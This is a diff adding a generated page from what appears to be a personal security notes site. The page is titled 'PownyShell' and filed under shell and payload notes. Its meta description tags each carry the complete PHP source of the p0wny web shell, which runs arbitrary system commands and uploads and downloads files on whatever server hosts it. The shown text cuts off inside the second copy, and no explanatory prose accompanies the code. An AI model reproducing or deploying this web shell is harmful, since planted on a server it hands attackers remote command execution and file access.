@@ -1,0 +1,2098 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/shell-and-payload/pownyshell/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/shell-and-payload/pownyshell/">
+
+
+<title>PownyShell  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/shell-and-payload/pownyshell/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="PownyShell">
+  <meta property="og:description" content="&lt;?php $SHELL_CONFIG = array( &#39;username&#39; =&gt; &#39;p0wny&#39;, &#39;hostname&#39; =&gt; &#39;shell&#39;, ); function expandPath($path) { if (preg_match(&#34;#^(~[a-zA-Z0-9_.-]*)(/.*)?$#&#34;, $path, $match)) { exec(&#34;echo $match[1]&#34;, $stdout); return $stdout[0] . $match[2]; } return $path; } function allFunctionExist($list = array()) { foreach ($list as $entry) { if (!function_exists($entry)) { return false; } } return true; } function executeCommand($cmd) { $output = &#39;&#39;; if (function_exists(&#39;exec&#39;)) { exec($cmd, $output); $output = implode(&#34;\n&#34;, $output); } else if (function_exists(&#39;shell_exec&#39;)) { $output = shell_exec($cmd); } else if (allFunctionExist(array(&#39;system&#39;, &#39;ob_start&#39;, &#39;ob_get_contents&#39;, &#39;ob_end_clean&#39;))) { ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(&#39;passthru&#39;, &#39;ob_start&#39;, &#39;ob_get_contents&#39;, &#39;ob_end_clean&#39;))) { ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(&#39;popen&#39;, &#39;feof&#39;, &#39;fread&#39;, &#39;pclose&#39;))) { $handle = popen($cmd, &#39;r&#39;); while (!feof($handle)) { $output .= fread($handle, 4096); } pclose($handle); } else if (allFunctionExist(array(&#39;proc_open&#39;, &#39;stream_get_contents&#39;, &#39;proc_close&#39;))) { $handle = proc_open($cmd, array(0 =&gt; array(&#39;pipe&#39;, &#39;r&#39;), 1 =&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $pipes); $output = stream_get_contents($pipes[1]); proc_close($handle); } return $output; } function isRunningWindows() { return stripos(PHP_OS, &#34;WIN&#34;) === 0; } function featureShell($cmd, $cwd) { $stdout = &#34;&#34;; if (preg_match(&#34;/^\s*cd\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir(expandPath(&#34;~&#34;)); } elseif (preg_match(&#34;/^\s*cd\s&#43;(.&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir($cwd); preg_match(&#34;/^\s*cd\s&#43;([^\s]&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd, $match); chdir(expandPath($match[1])); } elseif (preg_match(&#34;/^\s*download\s&#43;[^\s]&#43;\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir($cwd); preg_match(&#34;/^\s*download\s&#43;([^\s]&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd, $match); return featureDownload($match[1]); } else { chdir($cwd); $stdout = executeCommand($cmd); } return array( &#34;stdout&#34; =&gt; base64_encode($stdout), &#34;cwd&#34; =&gt; base64_encode(getcwd()) ); } function featurePwd() { return array(&#34;cwd&#34; =&gt; base64_encode(getcwd())); } function featureHint($fileName, $cwd, $type) { chdir($cwd); if ($type == &#39;cmd&#39;) { $cmd = &#34;compgen -c $fileName&#34;; } else { $cmd = &#34;compgen -f $fileName&#34;; } $cmd = &#34;/bin/bash -c \&#34;$cmd\&#34;&#34;; $files = explode(&#34;\n&#34;, shell_exec($cmd)); foreach ($files as &amp;$filename) { $filename = base64_encode($filename); } return array( &#39;files&#39; =&gt; $files, ); } function featureDownload($filePath) { $file = @file_get_contents($filePath); if ($file === FALSE) { return array( &#39;stdout&#39; =&gt; base64_encode(&#39;File not found / no read permission.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } else { return array( &#39;name&#39; =&gt; base64_encode(basename($filePath)), &#39;file&#39; =&gt; base64_encode($file) ); } } function featureUpload($path, $file, $cwd) { chdir($cwd); $f = @fopen($path, &#39;wb&#39;); if ($f === FALSE) { return array( &#39;stdout&#39; =&gt; base64_encode(&#39;Invalid path / no write permission.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } else { fwrite($f, base64_decode($file)); fclose($f); return array( &#39;stdout&#39; =&gt; base64_encode(&#39;Done.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } } function initShellConfig() { global $SHELL_CONFIG; if (isRunningWindows()) { $username = getenv(&#39;USERNAME&#39;); if ($username !== false) { $SHELL_CONFIG[&#39;username&#39;] = $username; } } else { $pwuid = posix_getpwuid(posix_geteuid()); if ($pwuid !== false) { $SHELL_CONFIG[&#39;username&#39;] = $pwuid[&#39;name&#39;]; } } $hostname = gethostname(); if ($hostname !== false) { $SHELL_CONFIG[&#39;hostname&#39;] = $hostname; } } if (isset($_GET[&#34;feature&#34;])) { $response = NULL; switch ($_GET[&#34;feature&#34;]) { case &#34;shell&#34;: $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match(&#39;/2&gt;/&#39;, $cmd)) { $cmd .= &#39; 2&gt;&amp;1&#39;; } $response = featureShell($cmd, $_POST[&#34;cwd&#34;]); break; case &#34;pwd&#34;: $response = featurePwd(); break; case &#34;hint&#34;: $response = featureHint($_POST[&#39;filename&#39;], $_POST[&#39;cwd&#39;], $_POST[&#39;type&#39;]); break; case &#39;upload&#39;: $response = featureUpload($_POST[&#39;path&#39;], $_POST[&#39;file&#39;], $_POST[&#39;cwd&#39;]); } header(&#34;Content-Type: application/json&#34;); echo json_encode($response); die(); } else { initShellConfig(); } ?&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34; /&gt; &lt;title&gt;p0wny@shell:~#&lt;/title&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34; /&gt; &lt;style&gt; html, body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; width: 100vw; height: 100vh; overflow: hidden; } *::-webkit-scrollbar-track { border-radius: 8px; background-color: #353535; } *::-webkit-scrollbar { width: 8px; height: 8px; } *::-webkit-scrollbar-thumb { border-radius: 8px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #bcbcbc; } #shell { background: #222; box-shadow: 0 0 5px rgba(0, 0, 0, .3); font-size: 10pt; display: flex; flex-direction: column; align-items: stretch; max-width: calc(100vw - 2 * var(--shell-margin)); max-height: calc(100vh - 2 * var(--shell-margin)); resize: both; overflow: hidden; width: 100%; height: 100%; margin: var(--shell-margin) auto; } #shell-content { overflow: auto; padding: 5px; white-space: pre-wrap; flex-grow: 1; } #shell-logo { font-weight: bold; color: #FF4180; text-align: center; } :root { --shell-margin: 25px; } @media (min-width: 1200px) { :root { --shell-margin: 50px !important; } } @media (max-width: 991px), (max-height: 600px) { #shell-logo { font-size: 6px; margin: -25px 0; } :root { --shell-margin: 0 !important; } #shell { resize: none; } } @media (max-width: 767px) { #shell-input { flex-direction: column; } } @media (max-width: 320px) { #shell-logo { font-size: 5px; } } .shell-prompt { font-weight: bold; color: #75DF0B; } .shell-prompt &gt; span { color: #1BC9E7; } #shell-input { display: flex; box-shadow: 0 -1px 0 rgba(0, 0, 0, .3); border-top: rgba(255, 255, 255, .05) solid 1px; padding: 10px 0; } #shell-input &gt; label { flex-grow: 0; display: block; padding: 0 5px; height: 30px; line-height: 30px; } #shell-input #shell-cmd { height: 30px; line-height: 30px; border: none; background: transparent; color: #eee; font-family: monospace; font-size: 10pt; width: 100%; align-self: center; box-sizing: border-box; } #shell-input div { flex-grow: 1; align-items: stretch; } #shell-input input { outline: none; } &lt;/style&gt; &lt;script&gt; var SHELL_CONFIG = &lt;?php echo json_encode($SHELL_CONFIG); ?&gt;; var CWD = null; var commandHistory = []; var historyPosition = 0; var eShellCmdInput = null; var eShellContent = null; function _insertCommand(command) { eShellContent.innerHTML &#43;= &#34;\n\n&#34;; eShellContent.innerHTML &#43;= &#39;&lt;span class=\&#34;shell-prompt\&#34;&gt;&#39; &#43; genPrompt(CWD) &#43; &#39;&lt;/span&gt; &#39;; eShellContent.innerHTML &#43;= escapeHtml(command); eShellContent.innerHTML &#43;= &#34;\n&#34;; eShellContent.scrollTop = eShellContent.scrollHeight; } function _insertStdout(stdout) { eShellContent.innerHTML &#43;= escapeHtml(stdout); eShellContent.scrollTop = eShellContent.scrollHeight; } function _defer(callback) { setTimeout(callback, 0); } function featureShell(command) { _insertCommand(command); if (/^\s*upload\s&#43;[^\s]&#43;\s*$/.test(command)) { featureUpload(command.match(/^\s*upload\s&#43;([^\s]&#43;)\s*$/)[1]); } else if (/^\s*clear\s*$/.test(command)) { // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer eShellContent.innerHTML = &#39;&#39;; } else { makeRequest(&#34;?feature=shell&#34;, {cmd: command, cwd: CWD}, function (response) { if (response.hasOwnProperty(&#39;file&#39;)) { featureDownload(atob(response.name), response.file) } else { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); } }); } } function featureHint() { if (eShellCmdInput.value.trim().length === 0) return; // field is empty -&gt; nothing to complete function _requestCallback(data) { if (data.files.length &lt;= 1) return; // no completion data.files = data.files.map(function(file){ return atob(file); }); if (data.files.length === 2) { if (type === &#39;cmd&#39;) { eShellCmdInput.value = data.files[0]; } else { var currentValue = eShellCmdInput.value; eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]); } } else { _insertCommand(eShellCmdInput.value); _insertStdout(data.files.join(&#34;\n&#34;)); } } var currentCmd = eShellCmdInput.value.split(&#34; &#34;); var type = (currentCmd.length === 1) ? &#34;cmd&#34; : &#34;file&#34;; var fileName = (type === &#34;cmd&#34;) ? currentCmd[0] : currentCmd[currentCmd.length - 1]; makeRequest( &#34;?feature=hint&#34;, { filename: fileName, cwd: CWD, type: type }, _requestCallback ); } function featureDownload(name, file) { var element = document.createElement(&#39;a&#39;); element.setAttribute(&#39;href&#39;, &#39;data:application/octet-stream;base64,&#39; &#43; file); element.setAttribute(&#39;download&#39;, name); element.style.display = &#39;none&#39;; document.body.appendChild(element); element.click(); document.body.removeChild(element); _insertStdout(&#39;Done.&#39;); } function featureUpload(path) { var element = document.createElement(&#39;input&#39;); element.setAttribute(&#39;type&#39;, &#39;file&#39;); element.style.display = &#39;none&#39;; document.body.appendChild(element); element.addEventListener(&#39;change&#39;, function () { var promise = getBase64(element.files[0]); promise.then(function (file) { makeRequest(&#39;?feature=upload&#39;, {path: path, file: file, cwd: CWD}, function (response) { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); }); }, function () { _insertStdout(&#39;An unknown client-side error occurred.&#39;); }); }); element.click(); document.body.removeChild(element); } function getBase64(file, onLoadCallback) { return new Promise(function(resolve, reject) { var reader = new FileReader(); reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); }; reader.onerror = reject; reader.readAsDataURL(file); }); } function genPrompt(cwd) { cwd = cwd || &#34;~&#34;; var shortCwd = cwd; if (cwd.split(&#34;/&#34;).length &gt; 3) { var splittedCwd = cwd.split(&#34;/&#34;); shortCwd = &#34;…/&#34; &#43; splittedCwd[splittedCwd.length-2] &#43; &#34;/&#34; &#43; splittedCwd[splittedCwd.length-1]; } return SHELL_CONFIG[&#34;username&#34;] &#43; &#34;@&#34; &#43; SHELL_CONFIG[&#34;hostname&#34;] &#43; &#34;:&lt;span title=\&#34;&#34; &#43; cwd &#43; &#34;\&#34;&gt;&#34; &#43; shortCwd &#43; &#34;&lt;/span&gt;#&#34;; } function updateCwd(cwd) { if (cwd) { CWD = cwd; _updatePrompt(); return; } makeRequest(&#34;?feature=pwd&#34;, {}, function(response) { CWD = atob(response.cwd); _updatePrompt(); }); } function escapeHtml(string) { return string .replace(/&amp;/g, &#34;&amp;amp;&#34;) .replace(/&lt;/g, &#34;&amp;lt;&#34;) .replace(/&gt;/g, &#34;&amp;gt;&#34;); } function _updatePrompt() { var eShellPrompt = document.getElementById(&#34;shell-prompt&#34;); eShellPrompt.innerHTML = genPrompt(CWD); } function _onShellCmdKeyDown(event) { switch (event.key) { case &#34;Enter&#34;: featureShell(eShellCmdInput.value); insertToHistory(eShellCmdInput.value); eShellCmdInput.value = &#34;&#34;; break; case &#34;ArrowUp&#34;: if (historyPosition &gt; 0) { historyPosition--; eShellCmdInput.blur(); eShellCmdInput.value = commandHistory[historyPosition]; _defer(function() { eShellCmdInput.focus(); }); } break; case &#34;ArrowDown&#34;: if (historyPosition &gt;= commandHistory.length) { break; } historyPosition&#43;&#43;; if (historyPosition === commandHistory.length) { eShellCmdInput.value = &#34;&#34;; } else { eShellCmdInput.blur(); eShellCmdInput.focus(); eShellCmdInput.value = commandHistory[historyPosition]; } break; case &#39;Tab&#39;: event.preventDefault(); featureHint(); break; } } function insertToHistory(cmd) { commandHistory.push(cmd); historyPosition = commandHistory.length; } function makeRequest(url, params, callback) { function getQueryString() { var a = []; for (var key in params) { if (params.hasOwnProperty(key)) { a.push(encodeURIComponent(key) &#43; &#34;=&#34; &#43; encodeURIComponent(params[key])); } } return a.join(&#34;&amp;&#34;); } var xhr = new XMLHttpRequest(); xhr.open(&#34;POST&#34;, url, true); xhr.setRequestHeader(&#34;Content-Type&#34;, &#34;application/x-www-form-urlencoded&#34;); xhr.onreadystatechange = function() { if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) { try { var responseJson = JSON.parse(xhr.responseText); callback(responseJson); } catch (error) { alert(&#34;Error while parsing response: &#34; &#43; error); } } }; xhr.send(getQueryString()); } document.onclick = function(event) { event = event || window.event; var selection = window.getSelection(); var target = event.target || event.srcElement; if (target.tagName === &#34;SELECT&#34;) { return; } if (!selection.toString()) { eShellCmdInput.focus(); } }; window.onload = function() { eShellCmdInput = document.getElementById(&#34;shell-cmd&#34;); eShellContent = document.getElementById(&#34;shell-content&#34;); updateCwd(); eShellCmdInput.focus(); }; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&#34;shell&#34;&gt; &lt;pre id=&#34;shell-content&#34;&gt; &lt;div id=&#34;shell-logo&#34;&gt; ___ ____ _ _ _ _ _ &lt;span&gt;&lt;/span&gt; _ __ / _ \__ ___ __ _ _ / __ \ ___| |__ ___| | |_ /\/|| || |_ &lt;span&gt;&lt;/span&gt; | &#39;_ \| | | \ \ /\ / / &#39;_ \| | | |/ / _` / __| &#39;_ \ / _ \ | (_)/\/_ .. _|&lt;span&gt;&lt;/span&gt; | |_) | |_| |\ V V /| | | | |_| | | (_| \__ \ | | | __/ | |_ |_ _|&lt;span&gt;&lt;/span&gt; | .__/ \___/ \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_) |_||_| &lt;span&gt;&lt;/span&gt; |_| |___/ \____/ &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/pre&gt; &lt;div id=&#34;shell-input&#34;&gt; &lt;label for=&#34;shell-cmd&#34; id=&#34;shell-prompt&#34; class=&#34;shell-prompt&#34;&gt;???&lt;/label&gt; &lt;div&gt; &lt;input id=&#34;shell-cmd&#34; name=&#34;cmd&#34; onkeydown=&#34;_onShellCmdKeyDown(event)&#34;/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PownyShell">
+  <meta name="twitter:description" content="&lt;?php $SHELL_CONFIG = array( &#39;username&#39; =&gt; &#39;p0wny&#39;, &#39;hostname&#39; =&gt; &#39;shell&#39;, ); function expandPath($path) { if (preg_match(&#34;#^(~[a-zA-Z0-9_.-]*)(/.*)?$#&#34;, $path, $match)) { exec(&#34;echo $match[1]&#34;, $stdout); return $stdout[0] . $match[2]; } return $path; } function allFunctionExist($list = array()) { foreach ($list as $entry) { if (!function_exists($entry)) { return false; } } return true; } function executeCommand($cmd) { $output = &#39;&#39;; if (function_exists(&#39;exec&#39;)) { exec($cmd, $output); $output = implode(&#34;\n&#34;, $output); } else if (function_exists(&#39;shell_exec&#39;)) { $output = shell_exec($cmd); } else if (allFunctionExist(array(&#39;system&#39;, &#39;ob_start&#39;, &#39;ob_get_contents&#39;, &#39;ob_end_clean&#39;))) { ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(&#39;passthru&#39;, &#39;ob_start&#39;, &#39;ob_get_contents&#39;, &#39;ob_end_clean&#39;))) { ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (allFunctionExist(array(&#39;popen&#39;, &#39;feof&#39;, &#39;fread&#39;, &#39;pclose&#39;))) { $handle = popen($cmd, &#39;r&#39;); while (!feof($handle)) { $output .= fread($handle, 4096); } pclose($handle); } else if (allFunctionExist(array(&#39;proc_open&#39;, &#39;stream_get_contents&#39;, &#39;proc_close&#39;))) { $handle = proc_open($cmd, array(0 =&gt; array(&#39;pipe&#39;, &#39;r&#39;), 1 =&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $pipes); $output = stream_get_contents($pipes[1]); proc_close($handle); } return $output; } function isRunningWindows() { return stripos(PHP_OS, &#34;WIN&#34;) === 0; } function featureShell($cmd, $cwd) { $stdout = &#34;&#34;; if (preg_match(&#34;/^\s*cd\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir(expandPath(&#34;~&#34;)); } elseif (preg_match(&#34;/^\s*cd\s&#43;(.&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir($cwd); preg_match(&#34;/^\s*cd\s&#43;([^\s]&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd, $match); chdir(expandPath($match[1])); } elseif (preg_match(&#34;/^\s*download\s&#43;[^\s]&#43;\s*(2&gt;&amp;1)?$/&#34;, $cmd)) { chdir($cwd); preg_match(&#34;/^\s*download\s&#43;([^\s]&#43;)\s*(2&gt;&amp;1)?$/&#34;, $cmd, $match); return featureDownload($match[1]); } else { chdir($cwd); $stdout = executeCommand($cmd); } return array( &#34;stdout&#34; =&gt; base64_encode($stdout), &#34;cwd&#34; =&gt; base64_encode(getcwd()) ); } function featurePwd() { return array(&#34;cwd&#34; =&gt; base64_encode(getcwd())); } function featureHint($fileName, $cwd, $type) { chdir($cwd); if ($type == &#39;cmd&#39;) { $cmd = &#34;compgen -c $fileName&#34;; } else { $cmd = &#34;compgen -f $fileName&#34;; } $cmd = &#34;/bin/bash -c \&#34;$cmd\&#34;&#34;; $files = explode(&#34;\n&#34;, shell_exec($cmd)); foreach ($files as &amp;$filename) { $filename = base64_encode($filename); } return array( &#39;files&#39; =&gt; $files, ); } function featureDownload($filePath) { $file = @file_get_contents($filePath); if ($file === FALSE) { return array( &#39;stdout&#39; =&gt; base64_encode(&#39;File not found / no read permission.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } else { return array( &#39;name&#39; =&gt; base64_encode(basename($filePath)), &#39;file&#39; =&gt; base64_encode($file) ); } } function featureUpload($path, $file, $cwd) { chdir($cwd); $f = @fopen($path, &#39;wb&#39;); if ($f === FALSE) { return array( &#39;stdout&#39; =&gt; base64_encode(&#39;Invalid path / no write permission.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } else { fwrite($f, base64_decode($file)); fclose($f); return array( &#39;stdout&#39; =&gt; base64_encode(&#39;Done.&#39;), &#39;cwd&#39; =&gt; base64_encode(getcwd()) ); } } function initShellConfig() { global $SHELL_CONFIG; if (isRunningWindows()) { $username = getenv(&#39;USERNAME&#39;); if ($username !== false) { $SHELL_CONFIG[&#39;username&#39;] = $username; } } else { $pwuid = posix_getpwuid(posix_geteuid()); if ($pwuid !== false) { $SHELL_CONFIG[&#39;username&#39;] = $pwuid[&#39;name&#39;]; } } $hostname = gethostname(); if ($hostname !== false) { $SHELL_CONFIG[&#39;hostname&#39;] = $hostname; } } if (isset($_GET[&#34;feature&#34;])) { $response = NULL; switch ($_GET[&#34;feature&#34;]) { case &#34;shell&#34;: $cmd = $_POST[&#39;cmd&#39;]; if (!preg_match(&#39;/2&gt;/&#39;, $cmd)) { $cmd .= &#39; 2&gt;&amp;1&#39;; } $response = featureShell($cmd, $_POST[&#34;cwd&#34;]); break; case &#34;pwd&#34;: $response = featurePwd(); break; case &#34;hint&#34;: $response = featureHint($_POST[&#39;filename&#39;], $_POST[&#39;cwd&#39;], $_POST[&#39;type&#39;]); break; case &#39;upload&#39;: $response = featureUpload($_POST[&#39;path&#39;], $_POST[&#39;file&#39;], $_POST[&#39;cwd&#39;]); } header(&#34;Content-Type: application/json&#34;); echo json_encode($response); die(); } else { initShellConfig(); } ?&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34; /&gt; &lt;title&gt;p0wny@shell:~#&lt;/title&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34; /&gt; &lt;style&gt; html, body { margin: 0; padding: 0; background: #333; color: #eee; font-family: monospace; width: 100vw; height: 100vh; overflow: hidden; } *::-webkit-scrollbar-track { border-radius: 8px; background-color: #353535; } *::-webkit-scrollbar { width: 8px; height: 8px; } *::-webkit-scrollbar-thumb { border-radius: 8px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3); background-color: #bcbcbc; } #shell { background: #222; box-shadow: 0 0 5px rgba(0, 0, 0, .3); font-size: 10pt; display: flex; flex-direction: column; align-items: stretch; max-width: calc(100vw - 2 * var(--shell-margin)); max-height: calc(100vh - 2 * var(--shell-margin)); resize: both; overflow: hidden; width: 100%; height: 100%; margin: var(--shell-margin) auto; } #shell-content { overflow: auto; padding: 5px; white-space: pre-wrap; flex-grow: 1; } #shell-logo { font-weight: bold; color: #FF4180; text-align: center; } :root { --shell-margin: 25px; } @media (min-width: 1200px) { :root { --shell-margin: 50px !important; } } @media (max-width: 991px), (max-height: 600px) { #shell-logo { font-size: 6px; margin: -25px 0; } :root { --shell-margin: 0 !important; } #shell { resize: none; } } @media (max-width: 767px) { #shell-input { flex-direction: column; } } @media (max-width: 320px) { #shell-logo { font-size: 5px; } } .shell-prompt { font-weight: bold; color: #75DF0B; } .shell-prompt &gt; span { color: #1BC9E7; } #shell-input { display: flex; box-shadow: 0 -1px 0 rgba(0, 0, 0, .3); border-top: rgba(255, 255, 255, .05) solid 1px; padding: 10px 0; } #shell-input &gt; label { flex-grow: 0; display: block; padding: 0 5px; height: 30px; line-height: 30px; } #shell-input #shell-cmd { height: 30px; line-height: 30px; border: none; background: transparent; color: #eee; font-family: monospace; font-size: 10pt; width: 100%; align-self: center; box-sizing: border-box; } #shell-input div { flex-grow: 1; align-items: stretch; } #shell-input input { outline: none; } &lt;/style&gt; &lt;script&gt; var SHELL_CONFIG = &lt;?php echo json_encode($SHELL_CONFIG); ?&gt;; var CWD = null; var commandHistory = []; var historyPosition = 0; var eShellCmdInput = null; var eShellContent = null; function _insertCommand(command) { eShellContent.innerHTML &#43;= &#34;\n\n&#34;; eShellContent.innerHTML &#43;= &#39;&lt;span class=\&#34;shell-prompt\&#34;&gt;&#39; &#43; genPrompt(CWD) &#43; &#39;&lt;/span&gt; &#39;; eShellContent.innerHTML &#43;= escapeHtml(command); eShellContent.innerHTML &#43;= &#34;\n&#34;; eShellContent.scrollTop = eShellContent.scrollHeight; } function _insertStdout(stdout) { eShellContent.innerHTML &#43;= escapeHtml(stdout); eShellContent.scrollTop = eShellContent.scrollHeight; } function _defer(callback) { setTimeout(callback, 0); } function featureShell(command) { _insertCommand(command); if (/^\s*upload\s&#43;[^\s]&#43;\s*$/.test(command)) { featureUpload(command.match(/^\s*upload\s&#43;([^\s]&#43;)\s*$/)[1]); } else if (/^\s*clear\s*$/.test(command)) { // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer eShellContent.innerHTML = &#39;&#39;; } else { makeRequest(&#34;?feature=shell&#34;, {cmd: command, cwd: CWD}, function (response) { if (response.hasOwnProperty(&#39;file&#39;)) { featureDownload(atob(response.name), response.file) } else { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); } }); } } function featureHint() { if (eShellCmdInput.value.trim().length === 0) return; // field is empty -&gt; nothing to complete function _requestCallback(data) { if (data.files.length &lt;= 1) return; // no completion data.files = data.files.map(function(file){ return atob(file); }); if (data.files.length === 2) { if (type === &#39;cmd&#39;) { eShellCmdInput.value = data.files[0]; } else { var currentValue = eShellCmdInput.value; eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]); } } else { _insertCommand(eShellCmdInput.value); _insertStdout(data.files.join(&#34;\n&#34;)); } } var currentCmd = eShellCmdInput.value.split(&#34; &#34;); var type = (currentCmd.length === 1) ? &#34;cmd&#34; : &#34;file&#34;; var fileName = (type === &#34;cmd&#34;) ? currentCmd[0] : currentCmd[currentCmd.length - 1]; makeRequest( &#34;?feature=hint&#34;, { filename: fileName, cwd: CWD, type: type }, _requestCallback ); } function featureDownload(name, file) { var element = document.createElement(&#39;a&#39;); element.setAttribute(&#39;href&#39;, &#39;data:application/octet-stream;base64,&#39; &#43; file); element.setAttribute(&#39;download&#39;, name); element.style.display = &#39;none&#39;; document.body.appendChild(element); element.click(); document.body.removeChild(element); _insertStdout(&#39;Done.&#39;); } function featureUpload(path) { var element = document.createElement(&#39;input&#39;); element.setAttribute(&#39;type&#39;, &#39;file&#39;); element.style.display = &#39;none&#39;; document.body.appendChild(element); element.addEventListener(&#39;change&#39;, function () { var promise = getBase64(element.files[0]); promise.then(function (file) { makeRequest(&#39;?feature=upload&#39;, {path: path, file: file, cwd: CWD}, function (response) { _insertStdout(atob(response.stdout)); updateCwd(atob(response.cwd)); }); }, function () { _insertStdout(&#39;An unknown client-side error occurred.&#39;); }); }); element.click(); document.body.removeChild(element); } function getBase64(file, onLoadCallback) { return new Promise(function(resolve, reject) { var reader = new FileReader(); reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); }; reader.onerror = reject; reader.readAsDataURL(file); }); } function genPrompt(cwd) { cwd = cwd || &#34;~&#34;; var shortCwd = cwd; if (cwd.split(&#34;/&#34;).length &gt; 3) { var splittedCwd = cwd.split(&#34;/&#34;); shortCwd = &#34;…/&#34; &#43; splittedCwd[splittedCwd.length-2] &#43; &#34;/&#34; &#43; splittedCwd[splittedCwd.length-1]; } return SHELL_CONFIG[&#34;username&#34;] &#43; &#34;@&#34; &#43; SHELL_CONFIG[&#34;hostname&#34;] &#43; &#34;:&lt;span title=\&#34;&#34; &#43; cwd &#43; &#34;\&#34;&gt;&#34; &#43; shortCwd &#43; &#34;&lt;/span&gt;#&#34;; } function updateCwd(cwd) { if (cwd) { CWD = cwd; _updatePrompt(); return; } makeRequest(&#34;?feature=pwd&#34;, {}, function(response) { CWD = atob(response.cwd); _updatePrompt(); }); } function escapeHtml(string) { return string .replace(/&amp;/g, &#34;&amp;amp;&#34;) .replace(/&lt;/g, &#34;&amp;lt;&#34;) .replace(/&gt;/g, &#34;&amp;gt;&#34;); } function _updatePrompt() { var eShellPrompt = document.getElementById(&#34;shell-prompt&#34;); eShellPrompt.innerHTML = genPrompt(CWD); } function _onShellCmdKeyDown(event) { switch (event.key) { case &#34;Enter&#34;: featureShell(eShellCmdInput.value); insertToHistory(eShellCmdInput.value); eShellCmdInput.value = &#34;&#34;; break; case &#34;ArrowUp&#34;: if (historyPosition &gt; 0) { historyPosition--; eShellCmdInput.blur(); eShellCmdInput.value = commandHistory[historyPosition]; _defer(function() { eShellCmdInput.focus(); }); } break; case 